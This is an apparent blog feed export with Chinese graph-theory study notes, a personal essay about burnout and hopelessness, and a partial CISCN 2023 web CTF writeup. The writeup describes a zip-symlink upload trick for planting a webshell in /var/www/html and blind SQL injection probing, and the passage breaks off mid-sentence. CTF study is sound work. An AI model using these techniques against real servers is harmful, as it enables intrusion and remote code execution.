title="图的定义"></a>图的定义</h6><p>一个<strong>图</strong>是一个序偶&lt;V,E&gt;，记为G&#x3D;&lt;V,E&gt;。</p><ul><li>V&#x3D;{v1,v2,v3···,vn}是有限非空集合，vi称为<strong>结点</strong>，简称点，V称为<strong>结点集</strong>。</li><li>E是有限集合，称为<strong>边集</strong>，E中的每个元素都有V中的结点对与之对应，称之为<strong>边</strong>。</li></ul><p>注意上面的结点对可以使有序的也可以是无序的，分别为有向边和无向边。</p><h6 id="图的表示"><a href="#图的表示" class="headerlink" title="图的表示"></a>图的表示</h6><p><strong>集合表示</strong>：将一个图记为G&#x3D;&lt;V,E&gt;，并写出了V和E的集合表示，称为图的集合表示</p><p><strong>图形表示</strong>：为了表示方便，一般往往只需要画出图形。</p><p><strong>矩阵表示</strong>：</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608185332879-1024x178.png"></p><p>无向图和有向图的邻接矩阵有些不同，无向图的矩阵一定是对称的。</p><p>对角线的数值为1表示环。</p><h6 id="图的操作"><a href="#图的操作" class="headerlink" title="图的操作"></a>图的操作</h6><p><strong>删除边</strong>：设 e∈Ｅ，用G-e表示从Ｇ中去掉边e得到的图，该操作称为删除边。又设 Ｅ′⊆Ｅ，用G-E′表示从G中删除E′中所有边得到的图，操作称为删除边集。</p><p><strong>删除点</strong>：设 ｖ∈Ｖ，用Ｇ－ｖ表示从Ｇ中去掉结点ｖ及ｖ关联的所有边得到的图，该操作称为删除结点。又设Ｖ′⊂Ｖ，用G-Ｖ′表示从Ｇ中删除Ｖ′中所有结点及关联的所有边得到的图，该操作称为删除结点子集。</p><p><strong>收缩边</strong>：设ｅ＝(ｕ，ｖ)∈Ｅ。用Ｇ＼ｅ表示从Ｇ中删除ｅ，将ｅ的两个端点ｕ、ｖ用一个新的 结点 ｗ 代替， 使ｗ关联除ｅ外的ｕ和ｖ关联的一切边，该操作称为边的收缩。一个图Ｇ可以收缩为图H，是指 Ｈ可以从G 经过若干次边的收缩而得到。</p><p><strong>新加边</strong>：设ｕ，v∈Ｖ(ｕ、ｖ可能相邻，也可能不相邻)。用Ｇ∪(ｕ，ｖ)表示在ｕ，ｖ之间加一条边(ｕ，ｖ)，该操作称为加新边。</p><h6 id="邻接点与邻接边"><a href="#邻接点与邻接边" class="headerlink" title="邻接点与邻接边"></a>邻接点与邻接边</h6><p><strong>邻接点</strong>：一条边的两个端点</p><p><strong>邻接边</strong>：具有公共结点的两条边</p><p><strong>孤立结点</strong>：图中不与任何结点相邻接的结点称为孤立结点</p><blockquote><p><strong>零图</strong>：仅由孤立结点组成的图。</p><p><strong>平凡图</strong>：仅含有一个节点的零图</p></blockquote><p>含有n个结点，m个边的图称为**(n,m)图**</p><h6 id="图的分类"><a href="#图的分类" class="headerlink" title="*图的分类"></a>*图的分类</h6><p><strong>有无方向</strong>：无向图，有向图，混合图</p><p><strong>有无平行边</strong>：多重图，线图，<strong>简单图</strong>。</p><blockquote><ul><li>含有平行边的图称为多重图，平行边的条数称为重数【有向图中始边与终边相同才是平行边，无向图中两结点间的都是平行边】</li><li>非多重图就是线图</li><li><strong>无环的线图就是简单图</strong></li></ul></blockquote><p><strong>是否含权</strong>：赋权图，无权图</p><h6 id="子图与补图"><a href="#子图与补图" class="headerlink" title="子图与补图"></a>子图与补图</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608191416444-1024x260.png"></p><p>生成子图：结点没变，边只有一部分</p><p>导出子图：一部分结点，但是这部分结点之间的边全部都有【比如全校数据中导出一个年级的数据来】</p><p><strong>完全图</strong>：</p><ul><li>无向简单图中[无环的线图]：G中任意两个结点之间都有边相连，称为<strong>无向完全图</strong>，简称完全图</li><li>有向简单图中：G中任意两个结点都有方向相反的两条边相连，称为有向简单图，也简称完全图</li></ul><p><strong>补图</strong>：结点集相同，边集是完全图边集的补集</p><blockquote><p>注意结点和原图是一样的，就是说有可能有孤立结点的情况，不能漏了</p></blockquote><hr><h5 id="握手定理"><a href="#握手定理" class="headerlink" title="握手定理"></a>握手定理</h5><p><strong>度</strong>：G&#x3D;&lt;V,E&gt;中以结点v∈V为端点的边数（有环的时候计算两次）称为结点v的度数。，简称度，记为deg(v)</p><p>有向图中要区分入度与出度。入度为deg-(v),出度为deg+(v)</p><p><strong>悬挂结点</strong>：度数为1的结点称为悬挂结点</p><p><strong>悬挂边</strong>:以悬挂结点为端点的边称为悬挂边</p><h6 id="定理6-1（握手定理）"><a href="#定理6-1（握手定理）" class="headerlink" title="定理6.1（握手定理）"></a>定理6.1（握手定理）</h6><p>图中结点度数的总和是边数的两倍</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608192457742.png"></p><p>有向图中，入度之和等于出度之和等于边数</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608192559519.png"></p><hr><h5 id="图的同构"><a href="#图的同构" class="headerlink" title="图的同构"></a>图的同构</h5><p>形象的说，若结点可以任意挪动位置，而且边是完全弹性的，只要在不拉断和长度不压缩为0的情况下，一个图可以变成另外一个图，就称这两个图是同构的。</p><p>两个图同构有三个<strong>必要条件</strong>：</p><ul><li>结点数目相同</li><li>边数相同</li><li>度数相同的结点数相同</li></ul><p>也就是说，上述三个条件有一个不满足，就不同构，但他们都满足不能说明图是同构的。</p><hr><h5 id="通路与回路"><a href="#通路与回路" class="headerlink" title="通路与回路"></a>通路与回路</h5><p>给定G&#x3D;&lt;V,E&gt;中结点和边相继交错出现的序列Γ＝v0e0v1e1v2···ekvk</p><p><strong>通路</strong>：若v0和vk不是同一个结点，则Γ 称为v0到vk的一条通路</p><p><strong>回路</strong>：v0&#x3D;vk，则此通路称为回路。</p><blockquote><p><strong>简单通路</strong>：通路中所有的边互不相同，或一条迹</p><p><strong>基本通路</strong>：通路中所有的结点互不相同(从而所有的边互不相同)</p><p><strong>基本回路</strong>：回路中所有的结点互不相同(从而所有的边互不相同)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608194012367-1024x171.png"></p><h6 id="通路与回路的计算"><a href="#通路与回路的计算" class="headerlink" title="通路与回路的计算"></a>通路与回路的计算</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608194023330-1024x203.png"></p><h6 id="可达与距离"><a href="#可达与距离" class="headerlink" title="可达与距离"></a>可达与距离</h6><p><strong>可达</strong>：vi与vj之间存在通路，就称vi和vj是可达的。</p><p><strong>距离</strong>：如果vi与vj是可达的，那么vi带vj的长度最短的通路的长度称为距离。记为d(vi,vj)</p><p><strong>定理</strong>：在一个具有n个结点的图中，如果从结点vi到结点vj存在一条通路，那么从vi到vj存在一条长度不大于n-1的通路。 —–由鸽笼定理可以证得</p><p>定义<strong>可达性矩阵P</strong>：</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608194941633-1024x267.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608195040171.png"></p><hr><h5 id="图的连通性"><a href="#图的连通性" class="headerlink" title="图的连通性"></a>图的连通性</h5><h6 id="无向图的连通性"><a href="#无向图的连通性" class="headerlink" title="无向图的连通性"></a>无向图的连通性</h6><p><strong>连通图</strong>：无向图G中任意两个结点都是可达的，则称G为连通图，否则为非连通图，或分离图</p><p><strong>连通分支</strong>：无向图G中结点之间的可达关系R的每个等价类导出的子图都成为G的一个连通分支，用P(G)表示。</p><blockquote><p>显然，无向图G是连通图当且仅当p(G)&#x3D;1；每个结点和每条边都在且仅在一个连通分支中。</p></blockquote><h6 id="有向图的连通性"><a href="#有向图的连通性" class="headerlink" title="有向图的连通性"></a>有向图的连通性</h6><p><strong>弱连通图</strong>：略去方向之后是连通的，就称弱连通图，否则就是非连通图</p><p><strong>单向连通图</strong>：G中任意一对结点之间，至少有一个结点到另一个结点是可达的</p><p><strong>强连通图</strong>：G中任意一对结点都是相互可达的。</p><h6 id="连通性的判断"><a href="#连通性的判断" class="headerlink" title="连通性的判断"></a>连通性的判断</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608195839525-1024x232.png"></p><p>连通分支：强连通分支&#x2F;单向连通分支&#x2F;弱连通分支 ···</p><hr><h2 id="第七章-特殊图"><a href="#第七章-特殊图" class="headerlink" title="第七章_特殊图"></a>第七章_特殊图</h2><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608200043478-1024x923.png"></p><hr><h5 id="树"><a href="#树" class="headerlink" title="树"></a>树</h5><ul><li><strong>连通而不含回路</strong>的无向图称为无向树，简称树</li></ul><p>树中度数为1的结点称为<strong>叶</strong>，度数大于1的结点称为<strong>分支点</strong>或者<strong>内部结点</strong>。每个连通分支都是树的无向图称为<strong>森林</strong>，平凡图称为平凡树</p><blockquote><p>树中没有环和平行边，因此一定是简单图，并且任何非平凡树中，都没有度数为0的结点</p></blockquote><h6 id="定理7-1"><a href="#定理7-1" class="headerlink" title="定理7.1"></a>定理7.1</h6><p>以下6个命题等价：G&#x3D;&lt;V,E&gt; V&#x3D;n , E &#x3D; m</p><ul><li>G连通且不含回路，即G是树</li><li>G中无回路，且<strong>m&#x3D;n-1</strong> <strong>【边数是结点数减一】</strong></li><li>G是连通的，且<strong>m&#x3D;n-1</strong></li><li>G中无回路，但在G中任意两个结点之间增加一个新边，就得到唯一的基本回路</li><li>G是连通的，但删除G中任一条边后，便不连通（n≥2）</li><li>G中每一对结点之间有唯一的基本通路（n≥2）</li></ul><p><strong>定理</strong>：任意非平凡树T&#x3D;(n,m)都至少有两片叶[利用握手定理和m&#x3D;n-1证得]</p><h6 id="生成树及算法"><a href="#生成树及算法" class="headerlink" title="生成树及算法"></a>生成树及算法</h6><p><strong>生成树</strong>：给定图G，G的某个生成子图是树，则称为G的生成树，生成树中的边称为树枝，G中不存在生成树中的边称为弦，所有弦的集合称为生成树的补。</p><p><strong>定理</strong>：一个图存在生成数的充分必要条件是G是<strong>连通的</strong>。</p><p>利用以下算法可以求得连通图的生成树</p><p><strong>破圈法</strong></p><p>每次删除回路中的一条边，其删除的边的总数为m-n+1</p><p><strong>避圈法</strong></p><p>每次选取G中的一条与已选取的边不构成回路的边，选取的边的总数为n-1。</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608202756936-1024x495.png"></p><p><strong>广度优先搜索算法</strong></p><p>可以从任意结点开始，比如说从a开始，把它标记为０(－)。 与a邻接的结点 是b和c，把它们标记为 １(ａ)。 接下来对邻接于b和c的未标记的结点e和f做标记。把它们分别标记为２(ｂ)和２(ｃ)。按这样的方法继续，直到所有的结点都有标记为止。一组可能的标记如图。连接每个结点到其前驱(在结点的标记中指明)的边就构成了一棵生成树</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608202904939-1024x321.png"></p><h6 id="最小生成树"><a href="#最小生成树" class="headerlink" title="最小生成树"></a>最小生成树</h6><p>G是连通是赋权图，T是G的一颗生成树，T的每个树枝所赋权值之和称为T的权，记为W(T)，G中既有最小权的生成树称为G的最小生成树。</p><p><strong>Kruskal 算法</strong></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608213908630-1024x929.png"></p><p><strong>Prim算法</strong></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608213940614-1024x717.png"></p><hr><h5 id="根数"><a href="#根数" class="headerlink" title="根数"></a>根数</h5><p>一个有向图，若略去所有有向边的方向所得到的无向图是一棵树，则称之为有向树。</p><p>一颗非平凡的有向树，如果恰有一个结点的入度为0，其余所有结点的入度均为1，则称之为根树或外向树。入度为0的结点称为根(root)；出度为0的结点称为叶；入度为1，出度大于0的结点称为内点；内点和跟统称为分支点。在根树中，从根到任一结点v的通路长度，统称为结点v的层数；所有结点的层数中最大的称为根树的高。</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608215318864-1024x319.png"></p><h6 id="根树的遍历"><a href="#根树的遍历" class="headerlink" title="根树的遍历"></a>根树的遍历</h6><p>应用最广泛的是二元树的遍历</p><p>先根次序遍历：</p><ul><li>根</li><li>左子树</li><li>右子树</li></ul><p>中根次序遍历：</p><ul><li>左子树</li><li>根</li><li>右子树</li></ul><p>后根次序遍历：</p><ul><li>左子树</li><li>右子树</li><li>根</li></ul><h6 id="最优树与哈夫曼算法"><a href="#最优树与哈夫曼算法" class="headerlink" title="最优树与哈夫曼算法"></a>最优树与哈夫曼算法</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608215643992-1024x199.png"></p><p><strong>最优树</strong>：</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608215716080-1024x203.png"></p><h6 id="哈夫曼算法"><a href="#哈夫曼算法" class="headerlink" title="哈夫曼算法"></a>哈夫曼算法</h6><p>过程：</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608215851736.png"></p><hr><h5 id="欧拉图"><a href="#欧拉图" class="headerlink" title="欧拉图"></a>欧拉图</h5><p>定义： 设G是无孤立结点的图， 若存在一条通路(回路，经过图中每<strong>边</strong>一次且仅一次。则称此通路(回路)为该图的一条欧拉通路(回路)。具有<strong>欧拉回路</strong>的图称为欧拉图。</p><h6 id="欧拉图的判定"><a href="#欧拉图的判定" class="headerlink" title="欧拉图的判定"></a>欧拉图的判定</h6><p><strong>无向图</strong>：</p><p>无向图具有一条欧拉通路，当且仅当G是连通的，且仅有零个或两个奇度数结点。</p><p>无向图是欧拉图，当且仅当G是连通的，且仅有零个奇度数结点。</p><p><strong>有向图</strong>：</p><p>有向图G具有一条欧拉通路，当且仅当G是连通的，且除了两个结点 以外，其余结点的入度等于出度。而这两个例外的结点中，一个结点的入度比出度大1，另一个结点的出度比入度大1。</p><p>有向图G是欧拉图，当且仅当G是连通的，且所有结点的入度等于出度。</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608220110560-1024x400.png"></p><p>欧拉图中找欧拉回路：可能的情况下，不走桥【割边】</p><hr><h5 id="哈密顿图"><a href="#哈密顿图" class="headerlink" title="哈密顿图"></a>哈密顿图</h5><p>经过图中每个<strong>结点</strong>一次且仅一次的通路 (回路)称为哈密顿通路(回路)。存在<strong>哈密顿回路</strong>的图称为哈密顿图</p><h6 id="哈密顿图的判定"><a href="#哈密顿图的判定" class="headerlink" title="哈密顿图的判定"></a>哈密顿图的判定</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608220452745-1024x200.png"></p><p>注意这只是判定的额必要条件，一般情况下我们通过找反例，也就是<strong>去掉的结点树小于得到的图的连通分支数</strong>，来证明某图不是哈密顿图。</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608220653423-1024x189.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608220713879-1024x143.png"></p><hr><h5 id="偶图"><a href="#偶图" class="headerlink" title="偶图"></a>偶图</h5><h6 id="偶图-1"><a href="#偶图-1" class="headerlink" title="偶图"></a>偶图</h6><p>若无向图的结点集Ｖ能够划分为两个子集Ｖ１，Ｖ２，满足Ｖ１∩Ｖ２＝⌀。且Ｖ１∪Ｖ２＝Ｖ。使得Ｇ中任意一条边的两个端点，一个属于Ｖ1，另一个属于Ｖ２.则称Ｇ为偶图或二部图、二分图。Ｖ１ 和 Ｖ２ 称为互补结点子集。</p><p><strong>完全偶图</strong></p><p>在偶图中，若Ｖ１中的每个结点与Ｖ２中的每个结点都有且仅有一条边相关联，则称偶图Ｇ为<strong>完全偶图</strong>或完全二部图、 完全二分图。</p><p><strong>偶图的判定</strong></p><p>无向图为偶图的充分必要条件是G的<strong>所有回路</strong>的长度均为偶数。</p><h6 id="匹配"><a href="#匹配" class="headerlink" title="匹配"></a>匹配</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608221222771.png"></p><h6 id="匹配存在性问题"><a href="#匹配存在性问题" class="headerlink" title="匹配存在性问题"></a>匹配存在性问题</h6><p><strong>霍尔定理</strong>：偶图中存在从V1到V2的匹配的充分必要条件是V1中任意k个结点至少与V2中的k个结点相邻接。k&#x3D;1,2，···，V1。</p><p><strong>t条件</strong>：设G是一个偶图：</p><ul><li>V1中每个结点至少关联t条边。 （t为正整数）</li><li>V2中每个结点至多关联t条边。</li></ul><blockquote><p>如果存在这个t，则一定是偶图，但是没有t不一定不是偶图。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608221753959-1024x154.png"></p><hr><h5 id="平面图"><a href="#平面图" class="headerlink" title="平面图"></a>平面图</h5><p>如果<strong>能够</strong>把一个无向图G的所有结点和边画在一个平面上，使得任何两边除公共结点之外没有其他交叉点，则称G为平面图，否则是非平面图。</p><h6 id="平面图的判断——观察"><a href="#平面图的判断——观察" class="headerlink" title="平面图的判断——观察"></a>平面图的判断——观察</h6><p>找出基本回路，再看有没有端点在其上的可能交叉的通路，将这些通路分别放到回路的内部或者外部，看看能否避免交叉。</p><h6 id="欧拉公式"><a href="#欧拉公式" class="headerlink" title="欧拉公式"></a>欧拉公式</h6><p>在平面图G的一个平面表示中：</p><p><strong>面</strong>：由边所包围的其内部不含图的结点和边的区域，称为G的一个面</p><p><strong>边界</strong>：包含该面的诸边所构成的回路称为这个面的边界</p><p><strong>次数</strong>：面r的边界的长度称为该面的次数，记为D(r)</p><p>区域面积有限的称为有限面，区域面积无限的称为无限面</p><blockquote><p>显然，平面图有且仅有一个无限面！</p><p><strong>平面图所有面的次数之和等于其边数的2倍</strong></p></blockquote><h6 id="欧拉公式-1"><a href="#欧拉公式-1" class="headerlink" title="欧拉公式"></a>欧拉公式</h6><p>一个凸多面体[平面图也适用]：n个顶点[结点]，m个棱[边]，r个面，有</p><p><strong>n-m+r&#x3D;2</strong></p><p>也就是说，<strong>结点数-边数+面数&#x3D;2</strong></p><h6 id="推论1"><a href="#推论1" class="headerlink" title="推论1"></a>推论1</h6><p><strong>ｍ≤３ｎ－６</strong></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608222759452.png"></p><h6 id="推论2"><a href="#推论2" class="headerlink" title="推论2"></a>推论2</h6><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608222823137.png"></p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608222838426-1024x173.png"></p><h6 id="库拉托夫斯基定理"><a href="#库拉托夫斯基定理" class="headerlink" title="库拉托夫斯基定理"></a>库拉托夫斯基定理</h6><p>一个图是平面图的充分必要条件是它的任何子图都不可能收缩为K5或K33</p><p>推论：一个图是非平面图的充分必要条件是它存在一个能收缩为K5或K33的子图，我们将K5和K33称为库拉托夫斯基图</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-20230608223020462-1024x108.png"></p>]]></content>
      
      
      <categories>
          
          <category> 课内 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 课内 </tag>
            
            <tag> 离散 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>要窒息了，但是想熬过去</title>
      <link href="/2023/06/06/%E8%A6%81%E7%AA%92%E6%81%AF%E4%BA%86%EF%BC%8C%E4%BD%86%E6%98%AF%E6%83%B3%E7%86%AC%E8%BF%87%E5%8E%BB/"/>
      <url>/2023/06/06/%E8%A6%81%E7%AA%92%E6%81%AF%E4%BA%86%EF%BC%8C%E4%BD%86%E6%98%AF%E6%83%B3%E7%86%AC%E8%BF%87%E5%8E%BB/</url>
      
        <content type="html"><![CDATA[<blockquote><p>去年的今天，我躺在床上，第二天就是高考了。</p></blockquote><p>去年我走出高考考场的时候，在想什么呢，不管考的怎么样，我一定是很开心的吧，想着未来，满脑子都是自由，我会想起高考前去书店买的那本《梅花易数》，我告诉自己，高考完那个暑假，我要先把易经精读一遍，然后学习奇门遁甲，然后学习梅花易数······我把自己的书桌整理了，有一个柜子里放上了所有高考前没能来得及读的书，有几本还是新的······我还告诉自己，要看些哲学书籍，要每天写随笔，脑子里面想象这这些，有好多想做的事情，很开心，很自由。</p><p>然后呢，然后，那些东西被永远的放在那个柜子里，早就已经有了灰尘，哲学，再没有碰过，kindle，总是充满电然后待机到电池耗尽，继续充电，继续吃灰。</p><p>然后呢，那个暑假，确定方向之后开始马不停蹄的学习，各种学习，不停的通宵，第二天拍一张日出，然后睡过去，觉得自己真的很努力。开学之后，为了进工作室，开始卷，开始熬夜，开始不去上课，开始不再早起。</p><p>然后呢，进了工作室感觉一身轻松，开始摆，开始嗜酒如命，开始交际，开始向往所谓的自由，开始变成特立独行的，人人讨厌的小丑。每天依旧忙碌，却一事无成，什么都在干，什么都没干。</p><hr><p>而，明天又是高考了，过了一年，这一年太过激烈，太过炽热，太大，大到我不知道怎么接住它，昨天想了一整天留级的事情，真想再过一个大一啊，想重新奋斗，想重新抓住那些没能抓住的东西，但是，总是这样给自己找退路，真的不帅。</p><blockquote><hr><p>虽然身体和精神都已经极度疲倦了，但是呢，还是决定继续这样蛮横的往前冲了，因为这样的人生才够酷！</p></blockquote><p>说这些有什么意义呢，我高中三年也就那样过来了，在出租屋里通宵刷语文的时候也没有绝望过，竞赛炸了灰溜溜的回班的时候也没有绝望过，被班主任在办公室骂的快要哭死的时候也没有绝望过。可是为什么，为什么现在看不到希望了呢？好像突然觉得一辈子也就这样了。想要抓住的东西太多了，可我始终碌碌无为不是吗。</p><p>以后会幸福的吧？<br>会有时间看日出日落，<br>会遇到惊艳自己一生的人吧。</p><p>青春十年：<br>三年，<br>三年，<br>四年。<br>然后是无数个十年。</p><p>每一天都生活在地上，<br>短暂的飞起，<br>像梦里那样，<br>迅速落地，<br>永远被追逐，<br>永远。</p><p>我说，<br>什么最重要呢，<br>我说，<br>今晚的月亮圆不圆，<br>我说，<br>明天是美好的一天吗。</p><p>我不要了，<br>我不要我的人生就这样了，<br>以前觉得用尽全力折断羽毛飞起来的小鸟很酷，<br>但我不要了。</p><p>酒吧关门，<br>我便离去。</p>]]></content>
      
      
      <categories>
          
          <category> 文学 </category>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 随笔 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ciscn-2023-web-部分writeup</title>
      <link href="/2023/06/02/ciscn-2023-web-%E9%83%A8%E5%88%86writeup/"/>
      <url>/2023/06/02/ciscn-2023-web-%E9%83%A8%E5%88%86writeup/</url>
      
        <content type="html"><![CDATA[<hr><h2 id="关于本次国赛"><a href="#关于本次国赛" class="headerlink" title="关于本次国赛"></a>关于本次国赛</h2><p>可以说暴露了很多问题，学的知识点太少了很多题根本没思路，全程只有misc输出，web唯一本来应该能做出来的SQL坐牢一天掉进自己的思维定式里面的，狠狠的被出题人坑傻了。最后无缘复赛，也没什么好遗憾的，实力如此，就是有点对不起队友和工作室，给他们丢脸了呜呜呜！</p><p>所以从现在开始决定花更多心思在CTF上了</p><blockquote><p>CTF不是web的全部，但我永远不会忘记哪些熬夜做招新题的夜晚······</p></blockquote><hr><h2 id="unzip"><a href="#unzip" class="headerlink" title="unzip"></a>unzip</h2><p>💚 有一个参看文件： <a href="https://forum.butian.net/share/906">https://forum.butian.net/share/906</a></p><hr><h3 id="题目环境"><a href="#题目环境" class="headerlink" title="题目环境"></a>题目环境</h3><p>题目给出源码，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line"> error_reporting(0);</span><br><span class="line"> highlight_file(__FILE__);</span><br><span class="line"> ​</span><br><span class="line"> $finfo = finfo_open(FILEINFO_MIME_TYPE);</span><br><span class="line"> if (finfo_file($finfo, $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]) === &#x27;application/zip&#x27;)&#123;</span><br><span class="line">     exec(&#x27;cd /tmp &amp;&amp; unzip -o &#x27; . $_FILES[&quot;file&quot;][&quot;tmp_name&quot;]);</span><br><span class="line"> &#125;;</span><br><span class="line"> ​</span><br><span class="line"> //only this!</span><br></pre></td></tr></table></figure><p>然后有一个文件上传的接口。</p><hr><p>做题分析</p><p>根据参考文章</p><ul><li>首先上传zip这个应该是不用改的，有比较强的验证，而且后面也有unzip的操作，所以应该就是上传zip文件了</li><li><code>cd /tmp &amp;&amp; unzip -o</code>应该是解题的关键，参考文章里面也有提到，看他的做法涉及到软连接，去看看。</li><li>发现软链接配合zip文件上传可是实现任意文件读取</li><li>而<code>unzip -o</code>是<code>不必先询问用户，unzip执行后覆盖原有的文件</code> -o参数目前猜测可能只是为了方便选手重复上传一样的名字的压缩包，所以关键是这个解压缩操作，配合软链接，也就是会执行软链接去任意文件读取</li><li>原来<code>-o</code> 的用处是，先上传一个软链接的压缩包指向王炸根目录，然后再上传一个同样名称的压缩包包含webshell，然后访问,就造成rce了</li></ul><hr><p>上传该exp1.zip解压出里边的文件也是软连接<code>/var/www/html</code>目录下。接下来的思路就是想办法构造一个gethsell文件让gethsell文件正好解压在<code>/var/www/html</code>此时就可以getshell。</p><p>构造第二个压缩包，我们先创建一个files目录(因为上一个压缩包里边目录就是files)，在files目录下写一个shell文件，在压缩创建的files目录 此时压缩包目录架构是：<code>test/shell.php.</code>当我们上传这个压缩包时会覆盖上一个目录，但是files目录软链接指向<code>/var/www/html</code> 。解压的时候会把<code>shell.php</code>放在<code>/var/www/html</code>，此时我们达到了getsehll的目的</p><hr><h3 id="silly的wp"><a href="#silly的wp" class="headerlink" title="silly的wp"></a>silly的wp</h3><p>zip可以打包软链接，首先创建一个指向&#x2F;var&#x2F;www&#x2F;html的软连接</p><p>然后将软连接压缩打包，为exp1.zip</p><p>上传到服务器解压，此时tmp目录就有一个指向&#x2F;var&#x2F;www&#x2F;html的软连接</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/Untitled.png"></p><p>删掉files软连接，创一个files文件夹，里面放一个webshell</p><p>压缩files，得到压缩包，exp2.zip</p><p><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/Untitled1.png"></p><p>服务器里解压，此时访问&#x2F;files&#x2F;shell.php发现文件存在，webshell工具连接即可</p><hr><h2 id="dumpit"><a href="#dumpit" class="headerlink" title="dumpit"></a>dumpit</h2><p>题目环境</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use ?db=&amp;table_2_query= or ?db=&amp;table_2_dump= to view the tables! etc:?db=ctf&amp;table_2_query=flag1</span><br></pre></td></tr></table></figure><h3 id="初审"><a href="#初审" class="headerlink" title="初审"></a>初审</h3><ul><li>题目提示flag在&#x2F;flag</li><li>先访问<code>?db=ctf&amp;table_2_query=flag1</code> flag1到5都访问了，提示让rce一个flag，初步猜测是SQL注入写文件getshell…</li><li>query赛道构造的语句是：<ul><li>select * from ctf.flag1</li><li>尝试构造查询其他表：</li></ul></li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from information_schema.global_variables where VARIABLE_NAME=&#x27;secure_file_priv&#x27;</span><br><span class="line">array(4) &#123; [&quot;VARIABLE_NAME&quot;]=&gt; string(16) &quot;SECURE_FILE_PRIV&quot; [0]=&gt; string(16) &quot;SECURE_FILE_PRIV&quot; [&quot;VARIABLE_VALUE&quot;]=&gt; string(0) &quot;&quot; [1]=&gt; string(0) &quot;&quot; &#125;</span><br></pre></td></tr></table></figure><p>发现<code>secure_file_priv</code> 为空，是可以写文件的。</p><ul><li>继续查看题目环境是否有写文件权限：简单输入一些查询语句，发现是没有读写权限的，，当时就在这里纠结了很久</li></ul><h3 id="我的思路"><a href="#我的思路" class="headerlink" title="我的思路"></a>我的思路</h3><ul><li><code>http://eci-2zehs7fgoxn8owsdgy7q.cloudeci1.ichunqiu.com:8888/?db=ctf&amp;table_2_query=flag1 where 1=1 and 1=2</code> 把后面的1&#x3D;2改成一个bool判断句，题目会返回查询结果或者bool(false)，利用这里的bool判断进行bool盲注</li></ul><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/image-1024x460.png" style="zoom:50%;" /><img src="https://cdn.jsdelivr.net/gh/p5ych2022/IHS@master/img/Untitled-1-1024x396.png" style="zoom:50%;" /><ul><li>但是这里跑了一下，length函数是可以用的，但是load_file全是FALSE，TIM佬当时就说了可能没有load_file也就是没有file权限，但是我不信邪呜呜呜，结果真的没有啊啊啊</li><li>当时在这里卡了很久，总想尝试load_file去读&#x2F;flag的内容，换各种bool语句，十六编码，结果就是坐牢一天。。</li></ul><h3 id="正解"><a href="#正解" class="headerlink" title="正解"></a>正解</h3><ul><li>一开始发现了题目进行了一些过滤，比如<code>;</code>被过滤了，就没想过编码绕过啥的。。</li><li>事实上，直接用<code>%0a</code> 